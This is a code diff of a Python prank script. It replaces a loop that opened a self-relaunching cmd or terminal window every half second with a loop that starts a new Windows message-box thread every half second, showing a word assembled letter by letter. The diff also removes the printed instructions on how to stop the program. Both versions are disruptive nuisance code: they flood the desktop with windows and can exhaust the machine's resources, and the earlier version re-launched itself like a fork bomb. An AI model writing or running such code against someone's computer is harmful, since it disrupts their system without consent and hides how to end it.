@@ -3,8 +3,8 @@ import time
 import os
 import threading
 import sys
+import ctypes
 
-# Слово для отображения
 s = 'с'
 i = 'и'
 p = 'п'
@@ -19,45 +19,26 @@ o = 'д'
 r = 'р'
 
 word = s + i + p + e + s2 + t + a + t2 + " " + e2 + b + o + r
+running = True
 
-def run_cmd_loop():
-    """Функция для постоянного запуска cmd с командой"""
+def show_message_box():
+    try:
+        ctypes.windll.user32.MessageBoxW(0, word, "Сообщение", 0x40 | 0x1)
+    except:
+        pass
+
+def run_message_loop():
     while running:
         try:
-            if sys.platform == "win32":
-                # Для Windows
-                subprocess.Popen(
-                    f'start cmd /k "echo {word} && python sipesta.py"',
-                    shell=True
-                )
-            else:
-                # Для Linux/Mac (опционально)
-                subprocess.Popen(
-                    f'gnome-terminal -- bash -c "echo {word}; python3 sipesta.py; exec bash"',
-                    shell=True
-                )
-            time.sleep(0.5)  # Небольшая задержка между запусками
+            threading.Thread(target=show_message_box).start()
+            time.sleep(0.5)
         except:
             pass
 
-# Флаг для контроля выполнения
-running = True
-
-print("Запуск бесконечного цикла cmd окон...")
-print("Нажмите Ctrl+C в этом окне для остановки")
+threading.Thread(target=run_message_loop).start()
 
 try:
-    # Запускаем поток с бесконечным открытием окон
-    thread = threading.Thread(target=run_cmd_loop)
-    thread.daemon = True
-    thread.start()
-    
-    # Бесконечный цикл, пока не нажмут Ctrl+C
     while True:
         time.sleep(1)
-        
 except KeyboardInterrupt:
-    print("\nОстановка программы...")
     running = False
-    print("Все окна больше не будут открываться")
-    time.sleep(2)
